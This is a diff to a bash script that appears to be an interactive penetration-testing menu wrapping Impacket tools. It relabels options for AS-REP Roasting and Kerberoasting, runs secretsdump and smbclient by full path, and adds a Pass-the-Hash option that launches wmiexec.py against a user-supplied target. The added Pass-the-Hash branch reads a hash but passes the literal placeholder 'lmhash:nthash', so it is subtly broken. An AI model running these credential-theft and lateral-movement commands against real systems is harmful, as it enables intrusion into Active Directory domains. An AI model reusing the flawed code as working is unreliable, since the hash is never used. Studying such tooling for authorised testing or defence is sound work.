@@ -1952,10 +1952,11 @@ run_enum4linux() {
 # Function to run Impacket tools
 run_impacket() {
     echo -e "${BLUE}[+] Running Impacket tools...${NC}"
-    echo -e "1) GetNPUsers"
-    echo -e "2) GetUserSPNs"
+    echo -e "1) AS-REP Roasting GetNPUsers"
+    echo -e "2) Kerberoasting GetUserSPNs"
     echo -e "3) SecretsDump"
     echo -e "4) SMBClient"
+    echo -e "5) Pass the Hash"
     read -e -p "Select an Impacket tool: " impacket_option
 
     case $impacket_option in
@@ -1963,27 +1964,34 @@ run_impacket() {
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            GetNPUsers.py $domain/$username -no-pass -dc-ip $target_ip
+            python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/$username -no-pass -dc-ip $target_ip
             ;;
         2)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
-            GetUserSPNs.py $domain/$username -dc-ip $target_ip
+            python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py $domain/$username -dc-ip $target_ip
             ;;
         3)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
             read -s -p "Enter password: " password
-            secretsdump.py $domain/$username:$password@$target_ip
+            python3 /usr/share/doc/python3-impacket/examples/secretsdump.py $domain/$username:$password@$target_ip
             ;;
         4)
             read -e -p "Enter target IP: " target_ip
             read -e -p "Enter domain name: " domain
             read -e -p "Enter username: " username
             read -s -p "Enter password: " password
-            smbclient.py $domain/$username:$password@$target_ip
+            python3 /usr/share/doc/python3-impacket/examples/smbclient.py $domain/$username:$password@$target_ip
+            ;;
+	5)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter hash: " hash
+            python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $domain/$username@$target_ip -hashes lmhash:nthash
             ;;
         *)
             echo -e "${RED}Invalid option. Please try again.${NC}"
